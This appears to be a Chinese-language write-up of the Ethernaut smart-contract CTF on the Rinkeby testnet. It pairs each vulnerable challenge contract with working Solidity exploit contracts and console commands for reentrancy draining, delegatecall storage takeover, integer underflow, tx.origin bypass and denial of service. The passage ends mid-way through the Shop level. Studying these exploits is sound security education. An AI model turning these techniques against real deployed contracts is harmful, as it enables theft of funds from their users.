---
comment: True
---

# Ethernaut Writeups

!!! abstract 
    https://ethernaut.openzeppelin.com/ 上的一系列以太坊智能合约类题目，入门 blockchain 的时候做的，这里记下做题记录

前置步骤：

- 安装 MetaMask 浏览器插件，并创建新账户
- 连接到 Rinkeby 测试网络
- 通过 https://faucet.rinkeby.io/ 或者 https://faucets.chain.link/rinkeby 搞点测试币（主要用来后续支付 gas）
- 在 ethernaut 上连接 MetaMask
- 每一道题目先生成新实例，在 console 中完成后提交实例

---

## Hello Ethernaut

按照题目提示一步一步调用函数即可

---

## Fallback

给了合约源码

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import '@openzeppelin/contracts/math/SafeMath.sol';

    contract Fallback {

        using SafeMath for uint256;
        mapping(address => uint) public contributions;
        address payable public owner;

        constructor() public {
            owner = msg.sender;
            contributions[msg.sender] = 1000 * (1 ether);
        }

        modifier onlyOwner {
            require(
                msg.sender == owner,
                "caller is not the owner"
            );
            _;
        }

        function contribute() public payable {
            require(msg.value < 0.001 ether);
            contributions[msg.sender] += msg.value;
            if(contributions[msg.sender] > contributions[owner]) {
                owner = msg.sender;
            }
        }

        function getContribution() public view returns (uint) {
            return contributions[msg.sender];
        }

        function withdraw() public onlyOwner {
            owner.transfer(address(this).balance);
        }

        receive() external payable {
            require(msg.value > 0 && contributions[msg.sender] > 0);
            owner = msg.sender;
        }
    }
    ```

目标是拿到这个合约的控制权，转出所有余额

主要逻辑是 contribute 函数会增加调用者的 contributions，当大于 1000 ether 的时候，会把所有权转给玩家。通过这个来获得控制权是不现实的

而另一个会发生所有权转换的函数是 receive 函数，这是一个 fallback 函数，会在合约账户接收以太币的时候触发，所以在这里只要向合约发出带有以太币的交易就可以触发这个函数转移所有权

而之前还需要先保证 contributions 大于 0，所以解法：
```js
> contract.contribute({value: 1})      // 使 contributions 大于 0 
> contract.sendTransaction({value: 1}) // 触发 fallback 转移所有权
> contract.withdraw()                  // 转出所有余额
```

---

## Fallout

要求得到合约的所有权

根据合约源码可以发现它的 constructor 的函数名为 Fal1out，并不是合约名 Fallout，有 l1 的差别

所以直接调用 contract.Fal1out() 就可以调用这个函数拿到合约所有权

---

## Coin Flip

??? question "题目合约"
    ```solidity
    pragma solidity ^0.6.0;

    import '@openzeppelin/contracts/math/SafeMath.sol';

    contract CoinFlip {

        using SafeMath for uint256;
        uint256 public consecutiveWins;
        uint256 lastHash;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        constructor() public {
            consecutiveWins = 0;
        }

        function flip(bool _guess) public returns (bool) {
            uint256 blockValue = uint256(blockhash(block.number.sub(1)));

            if (lastHash == blockValue) {
                revert();
            }

            lastHash = blockValue;
            uint256 coinFlip = blockValue.div(FACTOR);
            bool side = coinFlip == 1 ? true : false;

            if (side == _guess) {
                consecutiveWins++;
                return true;
            } else {
                consecutiveWins = 0;
                return false;
            }
        }
    }
    ```

要求连续猜对十次，合约中给出了它取随机数的方式，即将 block.number 减一，取哈希值，然后再除以 FACTOR 判断是否为 1

所以写一个新合约来获取同样的 block.number 就可以计算出答案

因为判断了 lashHash == blockValue 的时候 revert，所以需要等一段时间，逐次猜测，连续猜 10 次 

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: GPL-3.0
    pragma solidity ^0.6.0;

    /* code of CoinFlip */

    contract Exploit {
        using SafeMath for uint256;
        CoinFlip p;
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        constructor(address challenge) public {
            p = CoinFlip(challenge);
        }
        function exp() public {
            uint256 blockValue = uint256(blockhash(block.number.sub(1)));
            uint256 coinFlip = blockValue.div(FACTOR);
            bool side = coinFlip == 1 ? true : false;
            p.flip(side);
        }
    }
    ```

---

## Telephone

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract Telephone {
        address public owner;
        constructor() public {
            owner = msg.sender;
        }

        function changeOwner(address _owner) public {
            if (tx.origin != msg.sender) {
                owner = _owner;
            }
        }
    }
    ```

也是需要拿到合约的所有权，而调用合约中的 changeOwner 函数来转移所有权的话，需要使 tx.origin 和 msg.sender 不同

它们的区别：

- tx.origin：交易发送方，是整个交易最开始的地址
- msg.sender：消息发送方，是当前调用的调用方地址

所以如果通过 账户 A -> 合约 A -> 合约 B 来调用的话，tx.origin 就是账户 A，而对于合约 B 来说，msg.sender 是合约 A

所以这题只需要编写一个新的合约来调用题目的 changeOwner 函数就好了

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    /* code of Telephone */

    contract Exploit {
        Telephone p = Telephone(<instance address>);
        function exp() public {
            p.changeOwner(msg.sender);
        }
    }
    ```

---

## Token

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract Token {
        mapping(address => uint) balances;
        uint public totalSupply;

        constructor(uint _initialSupply) public {
            balances[msg.sender] = totalSupply = _initialSupply;
        }

        function transfer(address _to, uint _value) public returns (bool) {
            require(balances[msg.sender] - _value >= 0);
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            return true;
        }

        function balanceOf(address _owner) public view returns (uint balance) {
            return balances[_owner];
        }
    }
    ```

开局自己的 balance 是 20，目的是增加自己的 balance

可以发现 transfer 中是直接将 sender 的 balance 减转账的 value，而如果 value 超过 balance 则会发生溢出，因为是 uint，则会变为很大的值

所以通过 `#!js await contract.transfer(<any address>, 21)` 即可使自己的 balance 溢出变大

---

## Delegation

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract Delegate {
        address public owner;
        constructor(address _owner) public {
            owner = _owner;
        }
        function pwn() public {
            owner = msg.sender;
        }
    }

    contract Delegation {
        address public owner;
        Delegate delegate;
        constructor(address _delegateAddress) public {
            delegate = Delegate(_delegateAddress);
            owner = msg.sender;
        }
        fallback() external {
            (bool result,) = address(delegate).delegatecall(msg.data);
            if (result) {
                this;
            }
        }
    }
    ```

目的还是拿到所有权，即执行 Delegate 中的 pwn 函数

可以通过触发 fallback 函数，然后调用 delegatecall 来通过 msg.data 调用 pwn 函数

data 中前四个字节是要调用的函数前面的 sha3 值的前四个字节，后面如果没有传入数据可以省略

所以计算出 pwn() 的 sha3 然后作为 data 传给 fallback 即可

```js 
> web3.utils.sha3("pwn()")
'0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab'
> contract.sendTransaction({data: "0xdd365b8b"})
```

---

## Force

题目是一个空的合约，要求向其中转账

而一个合约在自毁的时候，可以将余额全部强制转到另一个地址上，所以新建一个合约然后自毁，把余额转到实例地址上就可以了

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Exploit {
    constructor() public payable {}  // 初始要接收 value 来创建合约
    function exp(address challenge) public {
        // 需要先强制转换为 payable
        address payable challenge = payable(address(challenge));
        selfdestruct(challenge);
    }
}
```

---

## Vault

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract Vault {
        bool public locked;
        bytes32 private password;

        constructor(bytes32 _password) public {
            locked = true;
            password = _password;
        }

        function unlock(bytes32 _password) public {
            if (password == _password) {
                locked = false;
            }
        }
    }
    ```

要 unlock 这个合约账户，也就是要找到 password

虽然 password 被设为了 private，但是在区块中的数据仍然是可见的，所以只要 getStorageAt 就可以了：
```js
> await web3.eth.getStorageAt(instance, 1) // 0 为 locked 的位置，1 为 password
'0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
> web3.utils.toAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
'A very strong secret password :)'
> await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
// 参数是 bytes32，所以不能直接传字符串进去
```

---

## King 

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract King {
        address payable king;
        uint public prize;
        address payable public owner;

        constructor() public payable {
            owner = msg.sender;  
            king = msg.sender;
            prize = msg.value;
        }

        receive() external payable {
            require(msg.value >= prize || msg.sender == owner);
            king.transfer(msg.value);
            king = msg.sender;
            prize = msg.value;
        }

        function _king() public view returns (address payable) {
            return king;
        }
    }
    ```

当题目再次出资更高的时候，king 就会回到题目上，要保持 king 在自己身上

而每次更换 king 的时候都会先把金额 transfer 给上一个 king，所以只要不接收就好了

可以使用 fallback，然后函数里面直接 revert

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Exploit {
    constructor(address challenge) public payable {
        challenge.call.gas(10000000).value(msg.value)("");
    }
    fallback() external {
        revert();
    }
}
```
注意需要支付大于 1 ether 才可以先拿到 king 

---

## Re-entrancy

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import '@openzeppelin/contracts/math/SafeMath.sol';

    contract Reentrance {
    
        using SafeMath for uint256;
        mapping(address => uint) public balances;

        function donate(address _to) public payable {
            balances[_to] = balances[_to].add(msg.value);
        }

        function balanceOf(address _who) public view returns (uint balance) {
            return balances[_who];
        }

        function withdraw(uint _amount) public {
            if(balances[msg.sender] >= _amount) {
                (bool result,) = msg.sender.call{value:_amount}("");
                if(result) {
                    _amount;
                }
                balances[msg.sender] -= _amount;
            }
        }

        receive() external payable {}
    }
    ```

重入攻击，因为使用的是 `#!js msg.sender.call{value:_amount}("")`，并且在这之后才减少 balances

而这个 call 会掉到 fallback 中，如果 fallback 里再次调用了 withdraw 就实现了重入攻击，不断取出目标合约的余额直到为 0

先通过 `#!js await getBalance(instance)` 得到目标合约中的 balance 为 0.001 ether，所以每次 withdraw 0.001 ether 就好

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    /* code of Reentrance */

    contract Exploit {
        Reentrance challenge;
        constructor(address payable addr) public payable {
            challenge = Reentrance(addr);
        }
        function exp() public {
            challenge.withdraw(0.001 ether);
        }
        fallback() external payable {
            if (address(challenge).balance >= 0) {
                challenge.withdraw(0.001 ether);
            }
        }
    }
    ```

首先直接部署合约，然后 `#!js contract.donate.sendTransaction(<exp contract addr>, {value: toWei("0.001")})` 先 donate 0.001 ether，然后调用 exp 函数就可以实现重入攻击提取出目标合约中的所有余额

---

## Elevator

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    interface Building {
        function isLastFloor(uint) external returns (bool);
    }


    contract Elevator {
        bool public top;
        uint public floor;

        function goTo(uint _floor) public {
            Building building = Building(msg.sender);

            if (! building.isLastFloor(_floor)) {
                floor = _floor;
                top = building.isLastFloor(floor);
            }
        }
    }
    ```

目的是使电梯达到最顶层，即使题目合约的 top 为 true

因为 top 的变化只会在 goTo 里发生变化，并且只有在 isLastFloor 为 false 的时候才会改 top，而且两次调用 isLastFloor 的输入一样

所以只需要让第一次调用 isLastFloor 返回 false，第二次返回 true 就可以了

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    /* code of Elevator */

    contract Exploit {
        Elevator elevator;
        bool top = true;
        constructor(address challenge) public {
            elevator = Elevator(challenge);
        }
        function isLastFloor(uint) public returns (bool) {
            top = !top;  // 调用一次就改一次返回值
            return top;
        }
        function exp() public {
            elevator.goTo(1);
        }
    }
    ```

这样在部署之后调用 exp 函数就可以让 top 为 true

---

## Privacy

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract Privacy {

        bool public locked = true;
        uint256 public ID = block.timestamp;
        uint8 private flattening = 10;
        uint8 private denomination = 255;
        uint16 private awkwardness = uint16(now);
        bytes32[3] private data;

        constructor(bytes32[3] memory _data) public {
            data = _data;
        }
        
        function unlock(bytes16 _key) public {
            require(_key == bytes16(data[2]));
            locked = false;
        }
    }
    ```

和 Vault 那题很相似，都是要读取 private 内容，然后调用 unlock

同样来用 `#!js web3.eth.getStorageAt` 来 dump 出 storage：
```js
> await web3.eth.getStorageAt(instance, 0)
'0x0000000000000000000000000000000000000000000000000000000000000001'
> await web3.eth.getStorageAt(instance, 1)
'0x00000000000000000000000000000000000000000000000000000000623b0e73'
> await web3.eth.getStorageAt(instance, 2)
'0x000000000000000000000000000000000000000000000000000000000e73ff0a'
> await web3.eth.getStorageAt(instance, 3)
'0x3c991a198af652eb94710764c3f0401f1120427381fa7c46eeb6231cde2c9569'
> await web3.eth.getStorageAt(instance, 4)
'0xa792357f9443825334e26c299815fc6253b294b4a9155f49ea735bd2631dc364'
> await web3.eth.getStorageAt(instance, 5)
'0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf'
> await web3.eth.getStorageAt(instance, 6)
'0x0000000000000000000000000000000000000000000000000000000000000000'
```

不难看出 0 处存储的是 bool locked，1 处是一个 256 位 ID，2 处是剩下的两个 uint8、一个 uint16 拼出来的，而 3～5 就是 data 了

所以 data[2] 也就是 `0x6710884543189de73f0dfb9d36a99f2a5e9c3c7e5eb1fd1dead5f49ee955cdcf`

而 unlock 需要 bytes16，而且在内部将 data[2] 强制转换为了 bytes16，这会取前 16 字节，所以最后调用 unlock:
```js
contract.unlock("0x6710884543189de73f0dfb9d36a99f2a")
```

---

## Gatekeeper One

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import '@openzeppelin/contracts/math/SafeMath.sol';

    contract GatekeeperOne {
        using SafeMath for uint256;
        address public entrant;

        modifier gateOne() {
            require(msg.sender != tx.origin);
            _;
        }

        modifier gateTwo() {
            require(gasleft().mod(8191) == 0);
            _;
        }

        modifier gateThree(bytes8 _gateKey) {
            require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
            require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
            require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
            _;
        }

        function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
            entrant = tx.origin;
            return true;
        }
    }
    ```

目标是通过三个 modifier 的检测，即有三个要求

- msg.sender != tx.origin：即通过一个合约来间接调用 enter
- gasleft() % 8191 == 0：运行到这一步时剩余的 gas 要是 8191 的倍数
- 输入的 _gateKey 满足三个条件

第一个好办，直接写一个合约就好

第二个因为过程中会消耗多少 gas 不明确，所以要先写一个试试来 debug，看看中途消耗了多少 gas：
```solidity
contract Exploit {
    GatekeeperOne challenge;
    constructor(address addr) public {
        challenge = GatekeeperOne(addr);
    }
    function exp() public {
        challenge.enter.gas(81910)(bytes8("0x123456"));
    }
}
```
先随意设置 gas 为 81910，然后部署合约、调用，debug（需要调到 JavaScript VM 上，使用 Inject 的 Rinkeby 网络好像没法调试）

单步运行，直到流程进入到 gateTwo 函数中的 GAS 指令（将剩余的 gas 压入栈中），此时显示当前步 gas 为 2，剩余 gas 为 81658

所以输入的 gas 为 81910 + (81910 - 81658) + 2 = 82164 时，压入栈中的 gas 刚好是 81910

对于第三个，bytes8 相当于 uint64，而且使用 uintx 来强制转换时从后往前取，所以需要满足：

- 16~31 位（后 3、4 字节）为 0
- 32 位及以上不全为 0
- 0~15 位（后两个字节）和自己地址的后两个字节相同

所以可以构造出需要的 bytes8 为 `#!js bytes8(0x0000000100000E28)`，把这个输入就可以通过三个 gate 了

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract Exploit {
        GatekeeperOne challenge;
        constructor(address addr) public {
            challenge = GatekeeperOne(addr);
        }
        function exp() public {
            challenge.enter.gas(82164)(bytes8(0x0000000100000E28));
        }
    }
    ```

---

## Gatekeeper Two

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract GatekeeperTwo {

        address public entrant;

        modifier gateOne() {
            require(msg.sender != tx.origin);
            _;
        }

        modifier gateTwo() {
            uint x;
            assembly { x := extcodesize(caller()) }
            require(x == 0);
            _;
        }

        modifier gateThree(bytes8 _gateKey) {
            require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
            _;
        }

        function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
            entrant = tx.origin;
            return true;
        }
    }
    ```

和上一题一样，也是有三个要求：

- msg.sender != tx.origin
- 当前 caller 的 codesize 为 0
- gateKey 异或 sender 的 keccak256 的前 8 字节为 0-1=0xFFFFFFFFFFFFFFFF

第一个同样通过合约解决

第二个，当合约还没创建完成的时候 codesize 为 0，所以 exp 要写在 constructor 里

第三个，异或计算一下就好

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract Exploit {
        GatekeeperTwo challenge;
        constructor(address addr) public {
            challenge = GatekeeperTwo(addr);
            uint64 key = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(0xFFFFFFFFFFFFFFFF);
            challenge.enter(bytes8(key));
        }
    }
    ```

---

## Naught Coin

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

    contract NaughtCoin is ERC20 {

        // string public constant name = 'NaughtCoin';
        // string public constant symbol = '0x0';
        // uint public constant decimals = 18;
        uint public timeLock = now + 10 * 365 days;
        uint256 public INITIAL_SUPPLY;
        address public player;

        constructor(address _player) 
        ERC20('NaughtCoin', '0x0')
        public {
            player = _player;
            INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
            // _totalSupply = INITIAL_SUPPLY;
            // _balances[player] = INITIAL_SUPPLY;
            _mint(player, INITIAL_SUPPLY);
            emit Transfer(address(0), player, INITIAL_SUPPLY);
        }
        
        function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
            super.transfer(_to, _value);
        }

        // Prevent the initial owner from transferring tokens until the timelock has passed
        modifier lockTokens() {
            if (msg.sender == player) {
                require(now > timeLock);
                _;
            } else {
                _;
            }
        } 
    } 
    ```

根据 [ERC-20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md) 创建了一个代币，合约在 https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol

题目给 transfer 函数加了 modifier，判断时间大于十年才会通过，发出 transfer

但是根据 ERC-20 的合约源码，可以发现还有一个 transferFrom 函数可以用来转移代币

```solidity
function transferFrom(
    address from,
    address to,
    uint256 amount
) public virtual override returns (bool) {
    address spender = _msgSender();
    _spendAllowance(from, spender, amount);
    _transfer(from, to, amount);
    return true;
}
```

而这要消耗 allowance，但是 approve 函数并没有施加限制，所以先 approve 一定的数量，然后 transferFrom 就可以转移出 player 身上的全部代币余额

```js
> (await contract.balanceOf(player)).toString()
'1000000000000000000000000'
> contract.approve(player, "1000000000000000000000000")
> contract.transferFrom(player, instance, "1000000000000000000000000")
> (await contract.balanceOf(player)).toString()
'0'
```

---

## Preservation

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract Preservation {

        // public library contracts 
        address public timeZone1Library;
        address public timeZone2Library;
        address public owner; 
        uint storedTime;
        // Sets the function signature for delegatecall
        bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

        constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
            timeZone1Library = _timeZone1LibraryAddress; 
            timeZone2Library = _timeZone2LibraryAddress; 
            owner = msg.sender;
        }
        
        // set the time for timezone 1
        function setFirstTime(uint _timeStamp) public {
            timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
        }

        // set the time for timezone 2
        function setSecondTime(uint _timeStamp) public {
            timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
        }
    }

    // Simple library contract to set the time
    contract LibraryContract {

        // stores a timestamp 
        uint storedTime;  

        function setTime(uint _time) public {
            storedTime = _time;
        }
    }
    ```

目标是拿到合约的所有权。但是从题目合约中看不到任何和更改 owner 有关的函数

根据提示，这个合约的漏洞在于通过 delegatecall 修改存储

通过 delegatecall 来调用另一个合约的函数并不会动用另一个合约的 storage，而是使用本地 storage。这就导致了在 setFirstTime 函数中调用 setTime 函数时更改 storedTime 实际上会更改处于 storage 中相同位置的 timeZone1Library。这样在下一次调用 setFirstTime 的时候就会调用另一个地址合约的 setTime 函数

因此可以部署一个攻击合约，其中实现 setTime 函数，里面将 owner 改为输入（注意要将攻击合约的内存布局搞的和 Preservation 合约相同），这样第一次 setFirstTime 使将 timeZone1Library 改为攻击合约的地址，第二次 setFirstTime 就可以调用到攻击合约的 setTime 函数，更改 owner。攻击合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Exploit {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;             // 保证这前面有两个 address
    function setTime(uint _time) public {
        owner = address(_time);
    }
}
```

实际操作：
```js
> await web3.eth.getStorageAt(instance, 0)
'0x000000000000000000000000<an address>'
> contract.setFirstTime("0x<Exploit contract address>")
> await web3.eth.getStorageAt(instance, 0)
'0x000000000000000000000000<Exploit contract address>'
> contract.setFirstTime(player)
> await web3.eth.getStorageAt(instance, 2) // owner
'0x000000000000000000000000<player address>'
> await contract.owner()
'0x<player address>'
```

---

## Recovery

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import '@openzeppelin/contracts/math/SafeMath.sol';

    contract Recovery {

        //generate tokens
        function generateToken(string memory _name, uint256 _initialSupply) public {
            new SimpleToken(_name, msg.sender, _initialSupply);
        
        }
    }

    contract SimpleToken {

        using SafeMath for uint256;
        // public variables
        string public name;
        mapping (address => uint) public balances;

        // constructor
        constructor(string memory _name, address _creator, uint256 _initialSupply) public {
            name = _name;
            balances[_creator] = _initialSupply;
        }

        // collect ether in return for tokens
        receive() external payable {
            balances[msg.sender] = msg.value.mul(10);
        }

        // allow transfers of tokens
        function transfer(address _to, uint _amount) public { 
            require(balances[msg.sender] >= _amount);
            balances[msg.sender] = balances[msg.sender].sub(_amount);
            balances[_to] = _amount;
        }

        // clean up after ourselves
        function destroy(address payable _to) public {
            selfdestruct(_to);
        }
    }
    ```

题意是 instance 调用了 generateToken 生成了一个 SimpleToken，但是不知道生成的合约地址，现在要调用这个合约的 selfdestruct 来将其中余额转到 player 账户中

因为区块链都是透明的，所以可以直接去 [Etherscan](https://etherscan.io/) 的 [Rinkeby 网络](https://rinkeby.etherscan.io/)中查找 instance 这个地址上的合约，及其中的 internal txns，就可以看到一个 Contract Creation，那个地址就是生成的 SimpleToken 地址，所以写一个 exp 来调用那个地址上的的 destroy 函数就好了

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    /* code of SimpleToken */

    contract Exploit {
        SimpleToken token;
        constructor(address payable challenge) public { // challenge 是找到的 SimpleToken 地址
            token = SimpleToken(challenge);
        }
        function exp() public {
            token.destroy(msg.sender);
        }
    }
    ```

---

## MagicNumber

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    contract MagicNum {

        address public solver;

        constructor() public {}

        function setSolver(address _solver) public {
            solver = _solver;
        }

        /*
            ____________/\\\_______/\\\\\\\\\_____        
             __________/\\\\\_____/\\\///////\\\___       
              ________/\\\/\\\____\///______\//\\\__      
               ______/\\\/\/\\\______________/\\\/___     
                ____/\\\/__\/\\\___________/\\\//_____    
                 __/\\\\\\\\\\\\\\\\_____/\\\//________   
                  _\///////////\\\//____/\\\/___________  
                   ___________\/\\\_____/\\\\\\\\\\\\\\\_ 
                    ___________\///_____\///////////////__
        */
    }
    ```

题目要求即写一个合约，字节码不超过 10 个字节，在调用 whatIsTheMeaningOfLife() 时返回 42

所以可以手写汇编，来对于所有调用都直接返回 42，要用到几个指令（可以在 https://ethervm.io/ 看到详细的指令与字节码的对应以及作用）

- PUSH1（60）：将一个 uint8 压入栈中
- MSTORE（52）：栈顶取出 offset，再取出 value，将 memory[offset:offset+32] 设置为 value
- RETURN（F3）：栈顶取出 offset，再取出 length，return memory[offset:offset+length]
- CODECOPY（39）：从栈上依次取出 destOffset、offset、length，设置 memory[destOffset:destOffset+length] = code[offset:offset+length]

在部署合约的时候，会先有一段 deploy code，用来把 runtime code 复制到指定位置，所以要编写两部分字节码

runtime code:
```asm
PUSH1 0x2a  ; 将 42 压入栈中
PUSH1 0x80  ; 要存储的位置，一般为 0x80
MSTORE      ; 设置 memory[0x80:0x80+0x20] = 0x2a
PUSH1 0x20  ; length 
PUSH1 0x80  ; offset
RETURN      ; return memory[0x80:0x80+0x20]
```
转换成字节码就是：602a 6080 52 6020 6080 f3

接下来要写 deploy code，其中要完成两个目标：

1. 将 runtime code 字节码拷贝到内存中
2. 将 runtime code 返回

EVM 汇编：
```asm
PUSH1 0x0a  ; length, runtime code 长度为 10 (0x0a)
PUSH1 0x0c  ; offset, 即 deploy code 的长度，整体算下来为 0x0C
PUSH1 0x00  ; destOffset, 存入内存中起始位置
CODECOPY    ; 将 runtime code 拷贝到内存开头
PUSH1 0x0a  ; length
PUSH1 0x00  ; offset
RETURN      ; 返回 runtime code
```
转换成字节码：600a 600c 6000 39 600a 6000 f3（长度正好对应 0x0c）

连起来就是最终的字节码：600a600c600039600a6000f3602a60805260206080f3

然后通过向空地址发送交易的形式创建合约，并找到合约地址再 setSolver 即可
```js
> web3.eth.sendTransaction({from: player, data: "0x600a600c600039600a6000f3602a60805260206080f3"})
⛏️ Sent transaction ⛏ https://rinkeby.etherscan.io/tx/<transaction hash>
⛏️ Mined transaction ⛏ https://rinkeby.etherscan.io/tx/<transaction hash>
> contract.setSolver("<contract address>")
```
其中 contract address 通过访问给出的 etherscan 的网址就可以查到创建的合约地址

---

## Alien Codex

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.5.0;

    import '../helpers/Ownable-05.sol';

    contract AlienCodex is Ownable {

        bool public contact;
        bytes32[] public codex;

        modifier contacted() {
            assert(contact);
            _;
        }
        
        function make_contact() public {
            contact = true;
        }

        function record(bytes32 _content) contacted public {
            codex.push(_content);
        }

        function retract() contacted public {
            codex.length--;
        }

        function revise(uint i, bytes32 _content) contacted public {
            codex[i] = _content;
        }
    }
    ```

要求拿到合约的所有权，这个 owner 的存储是在 Ownable 中定义的，它会和 contact 一起放在 storage 的 slot 0 处，目的就是改变这个位置的值

而 slot 1 的位置开始就是 codex 的存储，先是长度。所以可以通过调用 retract() 函数来使 length 向下溢出变成 2**256-1，也就可以访问到全部的 storage 区域，所以就只需要找到 slot 0 对应的 codex[i] 的 i

因为 codex[i] 实际上是表示 keccak256(slot of codex) + i 处，所以只要令 i = 2\*\*256 - keccak256(slot of codex) 就可以使其变为 2\*\*256，即溢出到 0 的位置

而 codex 的 slot 就是 1，所以只需要计算 2\*\*256 - keccak256(1):
```solidity
contract Exploit {
    function calc() public view returns (bytes32) {
        return keccak256(abi.encode(bytes32(uint(1))));
    }
}
```
得到 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6，用 2\*\*256 减去它得到 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a

然后更改这个位置到 player 地址就好了（要在地址前面补上一堆 0 和 contact）
```js
> contract.retract()
> await web3.eth.getStorageAt(instance, 0)
'0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'
> await web3.eth.getStorageAt(instance, 1)
'0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
> contract.revise("0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a", "0x000000000000000000000001<player address>")
```

---

## Denial

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import '@openzeppelin/contracts/math/SafeMath.sol';

    contract Denial {

        using SafeMath for uint256;
        address public partner; // withdrawal partner - pay the gas, split the withdraw
        address payable public constant owner = address(0xA9E);
        uint timeLastWithdrawn;
        mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

        function setWithdrawPartner(address _partner) public {
            partner = _partner;
        }

        // withdraw 1% to recipient and 1% to owner
        function withdraw() public {
            uint amountToSend = address(this).balance.div(100);
            // perform a call without checking return
            // The recipient can revert, the owner will still get their share
            partner.call{value:amountToSend}("");
            owner.transfer(amountToSend);
            // keep track of last withdrawal time
            timeLastWithdrawn = now;
            withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
        }

        // allow deposit of funds
        receive() external payable {}

        // convenience function
        function contractBalance() public view returns (uint) {
            return address(this).balance;
        }
    }
    ```

目的是要阻止 owner 在 withdraw 的时候提取到资产

重入攻击没有打出来，但是可以通过让攻击合约的 fallback 触发 assert 异常，这样消耗掉所有的 gas 后就再没法正常向 owner 转账了

???+ done "exp"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    /* code of Denial */

    contract Exploit {
        Denial challenge;
        constructor(address payable addr) public {
            challenge = Denial(addr);
        }
        function exp() public {
            challenge.setWithdrawPartner(address(this));
            challenge.withdraw();
        }
        receive() external payable {
            assert(false);
        }
    }
    ```

---

## Shop

??? question "题目合约"
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    interface Buyer {
        function price() external view returns (uint);
    }

    contract Shop {
        uint public price = 100;
        bool public isSold;

        function buy() public {
            Buyer _buyer = Buyer(msg.sender);

            if (_buyer.price() >= price && !isSold) {
                isSold = true;
                price = _buyer.price();
